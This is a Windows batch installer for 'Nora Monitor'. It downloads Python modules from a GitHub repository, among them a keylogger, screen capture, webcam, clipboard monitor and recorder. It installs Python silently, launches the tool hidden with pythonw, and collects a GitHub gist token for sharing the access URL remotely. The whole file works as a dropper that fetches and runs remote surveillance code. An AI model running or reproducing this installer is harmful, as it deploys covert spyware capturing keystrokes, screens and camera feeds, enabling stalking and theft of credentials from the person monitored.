@echo off
setlocal enabledelayedexpansion

set "DIR=%APPDATA%\NoraMonitor"
set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"
set "CONFIG=%DIR%\config.json"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

:: Download all Python files from GitHub
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$r='%RAW%'; $d='%DIR%';" ^
  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
  "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""

:: One-time config setup
if not exist "%CONFIG%" (
    echo.
    echo ============================================================
    echo  NORA MONITOR - One-time Setup
    echo ============================================================
    echo.
    echo  For auto URL sharing across devices, you need a GitHub token.
    echo  1. Go to: github.com/settings/tokens
    echo  2. Click "Generate new token (classic)"
    echo  3. Tick only "gist" permission
    echo  4. Copy the token and paste below
    echo.
    echo  Press Enter to skip (remote URL sharing disabled).
    echo.
    set /p GH_TOKEN=GitHub token:
    set /p PC_NAME=This PC's name (e.g. Home PC):
    if "!PC_NAME!"=="" set PC_NAME=My PC

    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "$t='!GH_TOKEN!'; $n='!PC_NAME!';" ^
      "@{github_token=$t; gist_id=''; pc_name=$n} | ConvertTo-Json | Set-Content '%CONFIG%'"
)

:: Install Python silently if not present
python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '$env:TEMP\pysetup.exe'"
    %TEMP%\pysetup.exe /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

:: Install dependencies quietly
pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location

:: Launch silently from install dir
start "" /D "%DIR%" pythonw "%DIR%\app.py"

echo.
echo Done! Nora Monitor is running.
echo Open http://localhost:9090 in your browser.
echo.
pause
endlocal
